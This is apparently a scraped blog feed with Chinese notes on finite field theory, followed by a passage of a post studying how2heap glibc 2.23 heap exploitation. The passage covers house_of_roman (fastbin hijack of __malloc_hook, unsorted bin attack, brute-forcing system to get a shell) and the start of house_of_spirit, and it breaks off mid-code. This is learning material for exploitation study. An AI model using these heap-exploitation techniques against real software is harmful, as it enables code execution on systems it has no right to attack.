F_0^*$是$\mathbb F$的乘法子群。这个证明与证明子群很相似。<br>$\because a,-a\in\mathbb F_0, \therefore0\in\mathbb F_0$，有加法单位元，每个元素有逆元。<br>$\because \forall a, b\in \mathbb F_0, a+b\in \mathbb F_0$，故运算封闭。<br>该运算由于在$\mathbb F$中构成域，因此满足交换律与结合律。因此$\mathbb F_0$是$\mathbb F$的加法子群。<br>$\because \forall a\in\mathbb F_0, a^{-1}\in\mathbb F_0$，故每个元素有逆元，有乘法单位元$e$<br>$\because \forall a, b\in \mathbb F_0, ab\in \mathbb F_0$，故运算封闭。<br>该运算由于在$\mathbb F$中构成域，因此满足交换律与结合律。因此$\mathbb F_0^*$是$\mathbb F$的乘法子群。<br>由于这两个运算在$\mathbb F$中满足分配律，因此在$\mathbb F_0$中同样满足。$\Box$</p><p><font color=red>定义$a^{-n}&#x3D;(a^n)^{-1}$，当$a\ne 0$时，定义$a^0&#x3D;e$。</font></p><hr><p><font color=purple>定理3.2</font> 设$\mathbb F$是一个域，那么：</p><ol><li>对于任意$a\in\mathbb F$，$0a&#x3D;a0&#x3D;0$；</li><li>对于任意$a,b\in\mathbb F$，若$ab&#x3D;0$，则$a&#x3D;0$或$b&#x3D;0$</li></ol><p><font color=dblue>证明方法：</font>$0a&#x3D;(0+0)a$ 证明1<br>若$a\ne 0$，则$ab&#x3D;a^{-1}ab&#x3D;b&#x3D;0$，若$b&#x3D;0$同理。</p><p><font color=red>在域中，二项式定理成立。</font></p><hr><p><font color=purple>定理3.3</font> 设$\mathbb F$是一个域，$a,b\in\mathbb F$，对于任意正整数$n$，有<br>$$(a+b)^n&#x3D;\sum_{i&#x3D;0}^n C_n^i a^{n-i} b^i<br>&#x3D;\sum_{i&#x3D;0}^n\begin{pmatrix}n\i\end{pmatrix}a^{n-i} b^i$$</p><p><font color=dblue>证明方法：</font>分配律易证。</p><hr><p><font color=blue>定义3.3</font> 设$\mathbb F$是一个域，如果存在正整数$m$，使得对于任意$a\in\mathbb F$均有$ma&#x3D;0$，则在所有满足上述条件的m中，最小的正整数称为域$\mathbb F$的特征。如果$m$不存在则称$\mathbb F$的特征为0。特征记作$char(\mathbb F)$。</p><hr><p><font color=blue>定义3.4</font> 设$\mathbb F, \mathbb k$是两个域，如果存在$\mathbb F$到$\mathbb k$的一一映射$\delta$，使得对于任意$a,b\in\mathbb F$，均有<br>$$\delta(a+<em>{\mathbb F}b)&#x3D;\delta(a)+</em>{\mathbb k}\delta(b), \delta(a\times_{\mathbb F} b)&#x3D;\delta(a)\times_{\mathbb k}\delta(b)$$<br>则称$\delta$为$\mathbb F$到$\mathbb k$的同构映射，称$\mathbb F, \mathbb k$同构，记作$\mathbb F\cong\mathbb k$。如果$\mathbb F&#x3D;\mathbb k$则称$\delta$为自同构映射，若对于任意$a\in\mathbb F$均有$\delta(a)&#x3D;a$，则称$\delta$为恒等自同构映射。<font color=red>一个域的最小子域称为该域的素域。</font></p><hr><p><font color=purple>定理3.4</font> 设$\mathbb F$是一个域，则$char(\mathbb F)$为0或某个素数$p$。特征为素数$p$的域的素域与$\mathbb Z_p$同构，特征为0的域的素域与$\mathbb Q$同构。</p><p><font color=dblue>证明方法：</font>此证明显然需要分为三个部分进行。<br>首先证明特征为0或素数。如果特征不是素数，则可写为$s\times t$的形式，也即$\forall a\in \mathbb F, (st)a&#x3D;sta&#x3D;0$，故$sa&#x3D;0$或$ta&#x3D;0$。此时特征就应该是$s$或$t$而非$st$。<br>当$\mathbb F$是一个域且特征不为0时，其所有子域显然均需要包含$0$和$e$，由于需要满足运算的封闭性，所以还需要包含$2e, 3e, …,(p-1)e$。由这些元素构成的集合容易证明其是一个域（需要注意乘法逆元的证明，由于$p$是素数，故对于任意的$0&lt;k&lt;p$，均能找到其关于模$p$的逆元，也就是对应的乘法逆元），因此这就是$\mathbb F$上最小的域。同构映射$\delta(ke)&#x3D;k$与$\mathbb Z_p$构成同构。<br>当$\mathbb F$的特征为0时，同样其所有子域均需要包含$0,e,2e,3e,…$。由加法运算的封闭性，还需要包含$-e,-2e,-3e,…$。又由于需要满足乘法逆元也包含于域中，所以$e^{-1}, 2e^{-1},…-e^{-1},-2e^{-1},…$也在子域中。又需要满足乘法的封闭性，故任意子域均需包含$\mathbb F_0&#x3D;{(ae)(be)^{-1}|a,b\in\mathbb Z,b\ne 0}$。这个集合容易证明域的所有判定性质，因此其本身就是一个域，而且是最小的子域。同构映射$\delta((ae)(be)^{-1})&#x3D;\frac{a}{b}$与$\mathbb Q$构成同构。</p><hr><p><font color=purple>定理3.5</font> 设$\mathbb F$是一个域，$char(\mathbb F)&#x3D;p$，则对于任意$a,b\in\mathbb F,n\ge 0$，均有<br>$$(a\pm b)^{p^n}&#x3D;a^{p^n}\pm b^{p^n}$$</p><p><font color=dblue>证明方法：</font>首先使用二项式定理证明$(a+b)^p&#x3D;a^p+b^p$：<br>$(a+b)^p$中的第i项为$\frac{p!}{i!(p-i)!}a^ib^{p-i}$，即证明$\frac{p!}{i!(p-i)!}$是$p$的倍数$(i\ne 0,i\ne p)$。显然这是一个整数，且$\frac{p!}{i!(p-i)!}&#x3D;p\times \frac{(p-1)!}{i!(p-i)!}$。后面的数不可能是分数，因为如果是，那么分母必然是$p$的倍数，但是分母显然与$p$互素。因此后面的数是整数，也就是说这个数能够被$p$整除。故得证第一项。<br>然后使用数学归纳法，用类似的方式证明后面的式子即可。</p><hr><p><font color=blue>定义3.5</font> 对于非负整数$i$，$a_ix^i,a_i\in\mathbb F$表示域$\mathbb F$上文字为x的单项式，称形式和$f(x)&#x3D;a_nx^n+a_{n-1}x^{n-1}+…+a_1x^1+a_0x^0,a_i\in\mathbb F$为域上文字为x的多项式，简称域$\mathbb F$上的多项式。$a_ix^i$称为$f(x)$的$i$次项，$a_i$称为$f(x)$的$i$次项系数。当$a_n\ne 0$时，称该多项式为n次多项式，$a_n$称为$f(x)$的首项系数，多项式$f(x)$的次数称为$\deg f(x)$。如果多项式各项系数均为0，称为零多项式，记为0，次数规定为$-\infty$。<br><font color=red>域$\mathbb F$上文字为x的所有多项式的集合用符号$\mathbb F[x]$表示，规定$x^0&#x3D;1\in\mathbb F,a_0x^0&#x3D;a_0\in\mathbb F$，则有$\mathbb F\subsetneq\mathbb F[x]$。注意按照上面的定义，$\mathbb F[x]$不是域。</font><br><font color=red>关于多项式次数，下面结论成立：</font><br>$$\deg (f(x)+g(x))\le max{\deg f(x), \deg g(x)}<br>\\deg(f(x)g(x))&#x3D;\deg f(x)+\deg g(x)$$</p><p><font color=red>注意：这里的x可以表示任意的东西而不仅限于$\mathbb F$，即anything，但是需要定义次方。</font></p><hr><p><font color=purple>定理3.6</font> 设$f(x),g(x)$为域$\mathbb F$上的两个多项式，$g(x)\ne 0$，则存在唯一一对多项式$q(x),r(x)$使得<br>$$f(x)&#x3D;q(x)g(x)+r(x),\deg r(x)&lt;\deg g(x)$$<br><font color=red>注意：不要看系数能否被整除，而应该注意到域的性质。由于域的特征只可能为素数或0，因此不要想当然地用诸如$5x^2+1$和$2x^2+4$来挑战这条定理，因为整数集并不是域！</font></p><p><font color=dblue>证明方法：</font>归纳。<br>存在性易证，总存在一个系数能够消去被除式的最高次项（利用乘法逆元）<br>唯一性：$(q(x)-q’(x))g(x)&#x3D;r’(x)-r(x),\deg (r’(x)-r(x))&lt;\deg g(x)$，故$q(x)&#x3D;q’(x), r(x)&#x3D;r’(x)$</p><p>定理中的式子称为多项式带余除法算式，$r(x)$称为余式，记作<font color=red>$(f(x))_{g(x)}&#x3D;r(x)$</font></p><hr><p><font color=purple>定理3.7</font> 多项式满足模加和模乘运算。证明略。</p><hr><p><font color=blue>定义3.6</font><br>整除：$r(x)&#x3D;0$<br>倍式与因式<br>真因式：次数小于倍式的因式</p><hr><p><font color=blue>定义3.7</font><br>可约多项式：不含次数大于0的真因式的多项式<br>不可约多项式</p><hr><p><font color=purple>定理3.8</font> 域$\mathbb F$上多项式$f(x)$可约，则当且仅当存在两个域$\mathbb F$上多项式$f_1(x),f_2(x)$，$\deg f_1(x)&lt;\deg f(x), \deg f_2(x)&lt;\deg f(x)$，使得$f(x)&#x3D;f_1(x)f_2(x)$</p><p>证明略。</p><hr><p><font color=purple>定理3.9</font> 如果有$g(x)|f_1(x), g(x)|f_2(x)$，则任意多项式$s(x),t(x)$，有$g(x)|s(x)f_1(x)+t(x)f_2(x)$</p><p><font color=dblue>证明方法：</font><br>设$f_1(x)&#x3D;g(x)q_1(x),f_2(x)&#x3D;g(x)q_2(x)$<br>则$s(x)f_1(x)+t(x)f_2(x)&#x3D;(s(x)q_1(x)+t(x)q_2(x))g(x)$一定是$g(x)$的倍式</p><hr><p><font color=blue>定义3.8</font> 公因式、最高公因式（首项系数为1，次数最高）、互素</p><hr><p><font color=purple>定理3.10</font> 欧几里得辗转相除法<br>$r_i(x)&#x3D;q_{i+1}(x)r_{i+1}(x)+r_{i+2}(x)$</p><ol><li>经过有限步之后，余式必然为0。</li><li>存在多项式$s(x),t(x)\in \mathbb F[x]$，使得$s(x)r_0(x)+t(x)r_1(x)&#x3D;r_n(x)$。</li><li>设$r_n(x)$首项系数为$c$，则$(r_0(x), r_1(x))&#x3D;c^{-1}r_n(x)$，且最高公因式唯一存在。</li><li>对于任意$c(x)\in \mathbb F(x)$，如果$c(x)|r_0(x),c(x)|r_1(x)$，那么$c(x)|(r_0(x),r_1(x))$</li></ol><p><font color=orange>推论</font> 多项式的裴蜀定理（描述、证明略）</p><hr><p><font color=purple>定理3.11</font> 设$f(x),g(x)$为域$\mathbb F$上两个不全为0的多项式，则对于任意$k(x)\in \mathbb F[x],(f(x)+g(x)k(x),g(x))&#x3D;(f(x),g(x))$<br>类比整数，证明略。</p><hr><p><font color=purple>定理3.12</font> 设$f_1(x),f_2(x)$为域$\mathbb F$上的多项式，$p(x)$为域$\mathbb F$上的不可约多项式，且$p(x)|f_1(x)f_2(x)$，若$(p(x),f_1(x))&#x3D;1$，则$p(x)|f_2(x)$<br>类比整数，证明使用定理3.10推论证明，略。</p><hr><p><font color=purple>定理3.13</font> 设$f_1(x),f_2(x)$为域$\mathbb F$上的多项式，$p(x)$为域$\mathbb F$上的不可约多项式，且$p(x)|f_1(x)f_2(x)$，则$p(x)|f_1(x)$或$p(x)|f_2(x)$<br>类比整数，证明略。</p><hr><p><font color=purple>定理3.14</font> 唯一因式分解定理：设$f(x)$是域$\mathbb F$上次数大于0的多项式，则$f(x)$可以唯一地表示为域$\mathbb F$上一些次数大于0的不可约多项式的乘积。特别地，若$f(x)$为首1多项式，且<br>$$f(x)&#x3D;p_1(x)p_2(x)…p_s(x)&#x3D;q_1(x)q_2(x)…q_t(x)$$<br>其中$p_i(x),q_i(x)$为域$\mathbb F$上次数大于0的首1不可约多项式，则有$s&#x3D;t$，经过适当调整可以使得对任意$i$均有$p_i(x)&#x3D;q_i(x)$</p><p><font color=dblue>证明方法：</font>归纳法。略</p><hr><p><font color=blue>定义3.9</font> 根：设$f(x)$为域$\mathbb F$上的多项式，如果$a\in \mathbb F$使得$f(a)&#x3D;0$，则称$a$是$f(x)$在域$\mathbb F$上的一个根。</p><hr><p><font color=purple>定理3.15</font> 余元定理：设$f(x)$为域$\mathbb F$上的多项式，对于任意$a\in \mathbb F$，存在$g(x)\in \mathbb F[x]$使得$f(x)&#x3D;(x-a)g(x)+f(a)$</p><p><font color=dblue>证明方法：</font>设$f(x)&#x3D;(x-a)g(x)+c$，代入$a$即可。</p><p><font color=red>本定理可以这样理解：将其看成域上离散的中值定理——$\frac{f(x)-f(a)}{x-a}&#x3D;g(x)$，认为中值定理在域上也成立。但是实际上写的时候不能写分式，因为并没有定义除这个运算。</font></p><p><font color=orange>推论1</font> 设$f(x)$为域$\mathbb F$上的多项式，$a$为$f(x)$在域$\mathbb F$的根的充要条件为$(x-a)|f(x)$<br><font color=orange>推论2</font> 设$f(x)$为域$\mathbb F$上的多项式，如果$a_1,a_2,…a_m$为$f(x)$在域$\mathbb F$的根，则存在$n-m$次多项式$g(x)\in \mathbb F[x]$使得$f(x)&#x3D;(x-a_1)(x-a_2)…(x-a_m)g(x)$<br><font color=orange>推论3</font> 设$f(x)$为域$\mathbb F$上的多项式，则$f(x)$在$\mathbb F$的任意扩域中，不同根的个数不会超过$n$（证明使用推论2证明）</p><hr><p><font color=purple>定理3.16</font> 设$f(x)$是域$\mathbb F$上的$n\ge 1$次不可约多项式，集合$\mathbb F[x]<em>{f(x)}&#x3D;{\sum</em>{i&#x3D;0}^{n-1}a_ix^i|a_i\in\mathbb F}$按照模$f(x)$的模加和模乘形成一个域。特别地，若$f(x)$是有限域$\mathbb F_q$上的$n$次不可约多项式，则$\mathbb F[x]<em>{f(x)}&#x3D;{\sum</em>{i&#x3D;0}^{n-1}a_ix^i|a_i\in\mathbb F_q}$按照模$f(x)$的模加和模乘形成一个元素个数为$q^n$的有限域。</p><p><font color=dblue>证明方法：</font>证明该运算系统满足域的每条性质。每个项的系数都可以取q个值，因此构造的域的元素个数为$q^n$</p><p>以$\mathbb F_q[x]^*_{f(x)}$表示$\mathbb F_q[x]_{f(x)}$的乘法群，其元素个数为$q^n-1$。</p><p><font color=red>注意：任何次数大于等于n的多项式在$\mathbb F[x]_{f(x)}$中均等于一个次数小于n的多项式，每一项的系数关于$\mathbb F$取余，整个多项式关于$f(x)$取余</font></p><hr><p><font color=purple>定理3.17</font> 设$f(x)$是域$\mathbb F$上的一个次数大于0的不可约多项式，那么$f(x)$必然在$\mathbb F$的某个扩域中有根。</p><p><font color=dblue>证明方法：</font>使用定理3.16构造的扩域。</p><p><font color=green>举例：</font>定义在$\mathbb Z_2$上的多项式$f(x)&#x3D;x^2+1$在其上不可约，因此构造扩域，集合元素为${0,1,x,x+1}$，则显然有$f(x)&#x3D;x^2+1&#x3D;0$，即$f(x)&#x3D;0$，x是多项式的一个根。（这里的x指的是扩域中的x，不要混淆了）</p><p><font color=orange>推论</font> $\mathbb F$上的任意一个次数为$n\ge 1$的多项式，必然在$\mathbb F$的扩域中可以分解为$n$个一次不可约多项式的乘积。</p><hr><p><font color=purple>定理3.18</font> 设$\mathbb E$是有限域，$\mathbb F_q$是其q元子域，则存在正整数n使得$|\mathbb E|&#x3D;q^n$。</p><p><font color=dblue>证明方法：</font>逐步扩大法。$\mathbb F_q&#x3D;\mathbb E_1$如果存在$\beta\in \mathbb E \setminus \mathbb E_1$，那么定义$\mathbb E_2&#x3D;{a_0+a_1\beta|a_0,a_1\in\mathbb F_q}$，其元素个数为$q^2$，如果还存在不在$\mathbb E_2$的元素，则继续扩展，直到$\mathbb E_n&#x3D;\mathbb E$为止。</p><p><font color=red>注意：这其中的$\mathbb E_i$不一定是一个域！在严格证明中将其描述为集合。</font></p><p><font color=orange>推论</font> 有限域的元素个数必为$p^n$，其中$p$为素数。任何有限域都是其素域的扩域。</p><hr><p><font color=purple>定理3.19</font> 设$\mathbb F_q$为q元有限域，$\mathbb F$为$\mathbb F_q$的扩域，$\alpha\in\mathbb F$，那么$\alpha$是多项式$x^q-x$的根当且仅当$\alpha\in\mathbb F_q$</p><p><font color=dblue>证明方法：</font>对于任意$\alpha\in\mathbb F_q$，$\alpha^q-\alpha&#x3D;(e+e+e+…+e)^q-\alpha&#x3D;e^q+e^q+…+e^q-\alpha&#x3D;\alpha-\alpha&#x3D;0$，故$x^q-x$的根是$\mathbb F_q$的所有元素，而其也只有这么多根（次数限制）。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>how2heap 深入学习(3)</title>
      <link href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-3/"/>
      <url>/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-3/</url>
      
        <content type="html"><![CDATA[<p>how2heap下载网址: <a href="https://github.com/shellphish/how2heap">传送门</a><br>Glibc源码查看网址：<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source">传送门</a><br>参考书籍：CTF竞赛权威指南-pwn篇</p><p>测试环境：Ubuntu 16.04<br>Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p><p>前两周事情比较多，暂停了pwn的复习，今天继续。<br>按照顺序，本文分析glibc 2_23文件夹中的第9~11个源码。</p><h1 id="9-house-of-roman"><a href="#9-house-of-roman" class="headerlink" title="9. house_of_roman"></a>9. house_of_roman</h1><p>这是一种需要进行暴力猜解的漏洞，在开启PIE时仍然有效。我们来看下源码是如何操作的。</p><h2 id="Step-1-控制-malloc-hook"><a href="#Step-1-控制-malloc-hook" class="headerlink" title="Step 1: 控制__malloc_hook"></a>Step 1: 控制__malloc_hook</h2><p>首先创建了4个chunk，大小分别为0x70, 0x90, 0x90, 0x70。</p><table><thead><tr><th align="center">number</th><th align="center">size</th><th align="center">name</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">0x70</td><td align="center">fastbin_victim</td></tr><tr><td align="center">2</td><td align="center">0x90</td><td align="center">&lt;anonymous&gt;</td></tr><tr><td align="center">3</td><td align="center">0x90</td><td align="center">main_arena_use</td></tr><tr><td align="center">4</td><td align="center">0x70</td><td align="center">relative_offset_heap</td></tr></tbody></table><p>之后将第3个chunk释放，其fd和bk指针将指向main_arena + 0x68的位置。</p><p>接下来再分配一个0x70大小的chunk(name: fake_libc_chunk)，分配后原先的unsorted bin会被分割一部分，剩下0x21大小仍为unsorted bin，而此时在fake_libc_chunk中已经有了main_arena + 0x68的地址了。</p><p>后面，依次释放relative_offset_heap和fastbin_victim。此时bins的结构为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x555555757000 &lt;fastbin_victim&gt; —▸ 0x555555757190 &lt;relative_offset_heap&gt;◂— 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555757170 &lt;main_arena_use的一部分&gt; —▸ 0x7ffff7bcdb78 (main_arena+88) ◂— 0x555555757170 /* &#x27;pquUUU&#x27; */</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>堆的结构为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757000</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x555555757190</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555757070</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555757100</span><br><span class="line">Size: 0x71</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757170</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7ffff7bcdb78</span><br><span class="line">bk: 0x7ffff7bcdb78</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins)</span><br><span class="line">Addr: 0x555555757190</span><br><span class="line">Size: 0x70</span><br><span class="line">fd: 0x00</span><br></pre></td></tr></table></figure><p>之后，将第一个chunk的fd指针部分覆盖（覆盖最低1字节为0），那么此时第一个chunk指向的就是0x555555757100处，也就是刚分配的0x70空间的首部。此操作完成之后，堆结构变为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757000</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x555555757100</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555757070</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757100</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x7ffff7bcdbf8</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757170</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7ffff7bcdb78</span><br><span class="line">bk: 0x7ffff7bcdb78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555757190</span><br><span class="line">Size: 0x70</span><br></pre></td></tr></table></figure><p>bins的结构为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x555555757000 —▸ 0x555555757100 —▸ 0x7ffff7bcdbf8 (main_arena+216) ◂— 0x7ffff7bcdbf8</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555757170 —▸ 0x7ffff7bcdb78 (main_arena+88) ◂— 0x555555757170 /* &#x27;pquUUU&#x27; */</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>之后，我们就可以将0x555555757100（此时实际上并不是freed chunk）的fd指针修改为malloc_hook - 0x23。但是由于开启了PIE，因此需要爆破4个比特位，即16选1。</p><font color=red>注意：PIE会对地址进行随机化处理，但是一页之内的地址还是一样的，也就是说，开启和不开启PIE时地址的最低12bit是完全相同的。我们可以获取libc中malloc_hook的相对地址，其低12bit可以获得，但覆盖是整个字节覆盖，因此我们需要猜解随机化地址的倒数第2低字节中的高4位。</font><p>覆盖地址为0x555555757100的chunk的fd指针的低2字节，如果爆破成功，后面连续分配两个0x70大小chunk后再分配一个即将fastbin挟持到__malloc_hook。</p><p>这是__malloc_hook前面一部分内存空间的情况。</p><table><thead><tr><th align="center">addr</th><th align="center">+0</th><th align="center">+1</th><th align="center">+2</th><th align="center">+3</th><th align="center">+4</th><th align="center">+5</th><th align="center">+6</th><th align="center">+7</th></tr></thead><tbody><tr><td align="center">0x7ffff7bcdae8</td><td align="center">00</td><td align="center">00</td><td align="center">00</td><td align="center">00</td><td align="center">00</td><td align="center">00</td><td align="center">00</td><td align="center">00</td></tr><tr><td align="center">0x7ffff7bcdaf0(_IO_wide_data_0+304)</td><td align="center">60</td><td align="center">c2</td><td align="center">bc</td><td align="center">f7</td><td align="center">ff</td><td align="center"><font color=red>7f</font></td><td align="center"><font color=red>00</font></td><td align="center"><font color=red>00</font></td></tr><tr><td align="center">0x7ffff7bcdaf8</td><td align="center"><font color=red>00</font></td><td align="center"><font color=red>00</font></td><td align="center"><font color=red>00</font></td><td align="center"><font color=red>00</font></td><td align="center"><font color=red>00</font></td><td align="center">00</td><td align="center">00</td><td align="center">00</td></tr><tr><td align="center">0x7ffff7bcdb00(__memalign_hook)</td><td align="center">a0</td><td align="center">ee</td><td align="center">88</td><td align="center">f7</td><td align="center">ff</td><td align="center">7f</td><td align="center">00</td><td align="center">00</td></tr><tr><td align="center">0x7ffff7bcdb08(__realloc_hook)</td><td align="center">70</td><td align="center">ea</td><td align="center">88</td><td align="center">f7</td><td align="center">ff</td><td align="center">7f</td><td align="center">00</td><td align="center">00</td></tr><tr><td align="center">0x7ffff7bcdb10(__malloc_hook)</td><td align="center">00</td><td align="center">00</td><td align="center">00</td><td align="center">00</td><td align="center">00</td><td align="center">00</td><td align="center">00</td><td align="center">00</td></tr></tbody></table><p>我们现在解释为什么要将地址挟持到__malloc_hook - 0x23处。</p><font color=red>fastbin的重新分配会进行一个检查：后面一个fastbin的大小是否在fastbin可以容纳的chunk的大小范围之内。因此我们需要转移到一个这样一个地址，这个地址后面对应的size域有一个0x20~0x80的值。看到上面的表，我们想借用7f。如何借用？注意到0x7ffff7bcdaf5处有一个7f（这个7f一般是固定不变的），而且这之后有10个字节都是0，如果我们从这里开始读8个字节，那值就正好是0x7f，不会超过0x80。所以考虑将0x7ffff7bcdaed作为chunk的头部，这样读取到的size就可以通过检查。</font><h2 id="Step-2-Unsorted-bin-attack"><a href="#Step-2-Unsorted-bin-attack" class="headerlink" title="Step 2: Unsorted bin attack"></a>Step 2: Unsorted bin attack</h2><p>在第一步中，我们成功将fastbin挟持到了__malloc_hook处。但是由于libc的加载地址仍然未知，现在我们能做的仍然非常有限。因此下一步我们准备进行一次unsorted bin attack。</p><p>首先分配一个0x90大小的chunk(name: unsorted_bin_ptr)，之后分配一个0x30大小的chunk防止unsorted bin与top chunk合并。下面就是常规的unsorted bin attack流程：</p><p>释放unsorted_bin_ptr，利用UAF将其bk指针修改为__malloc_hook - 0x10（这里只需要修改最低2字节，而且这在第一步已经通过爆破获取）。然后将这个unsorted bin分配出来，这样main_arena + 0x68被修改为__malloc_hook - 0x10，同时__malloc_hook被修改为main_arena + 0x68（这是双向链表中元素脱链的标准操作，即要脱链的为chunk，则需将chunk-&gt;bk-&gt;fd指向main_arena + 0x68，main_arena + 0x68指向chunk-&gt;bk，图示如下）</p><p><img src="https://img-blog.csdnimg.cn/59b52215ec91403bb1f2eccb62afe289.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQWdDbOKGkQ==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><h2 id="Step-3-getshell"><a href="#Step-3-getshell" class="headerlink" title="Step 3: getshell"></a>Step 3: getshell</h2><p>之后，我们需要利用挟持到__malloc_hook的chunk部分修改__malloc_hook的值。首先，我们在第一步已经通过爆破获取了__malloc_hook地址的低2字节，根据这低2字节，我们可以在libc中获取到system加载地址的低2字节。</p><p>例如，libc6_2.23-0ubuntu11.3_amd64版本中system地址为0x453a0，__malloc_hook地址为0x3c4b10。假如爆破成功时__malloc_hook加载地址的低2字节为0x8b10，那么说明加载地址等于相对地址加上(0x400 + n * 0x1000)。即system加载地址的低2字节应为0x93a0。</p><p>我们获取到system地址的低2字节后，需要爆破system地址第3小的字节。注意到0x3c4b10 - 0x453a0 &#x3D; 0x37f770，system的地址和__malloc_hook的地址除低3字节外剩余部分很有可能相等。因此只对第3小的字节进行爆破即可。</p><p>随机猜解system地址如果成功，在之后进行malloc，参数可以填one_gadget，这样就可以成功获取shell。</p><p>综上所述，house_of_roman一共需要爆破12比特位，加上加载地址可能造成的影响，爆破成功的概率应该略低于 1 &#x2F; 2^12，多试几次就可以getshell。</p><h1 id="10-house-of-spirit"><a href="#10-house-of-spirit" class="headerlink" title="10. house_of_spirit"></a>10. house_of_spirit</h1><p>这是一种常用的堆漏洞，核心思想也很简单：在目标地址伪造一个chunk并引导libc将这块内存释放，下一次malloc即可分配到目标地址处。</p><p>这里需要注意的就是伪造堆块的方法。</p><h2 id="重要：-int-free函数的fastbin检查："><a href="#重要：-int-free函数的fastbin检查：" class="headerlink" title="重要：_int_free函数的fastbin检查："></a>重要：_int_free函数的fastbin检查：</h2><ol><li><p>检查堆块的size是否过大到不切实际</p></li><li><p>检查chunk是否对齐（x64的chunk头必须是0x8对齐的，即最低4bit只能为0或8）</p></li></ol><p>上述两种检查如果没有通过，直接报错中止，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">size = chunksize (p);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">  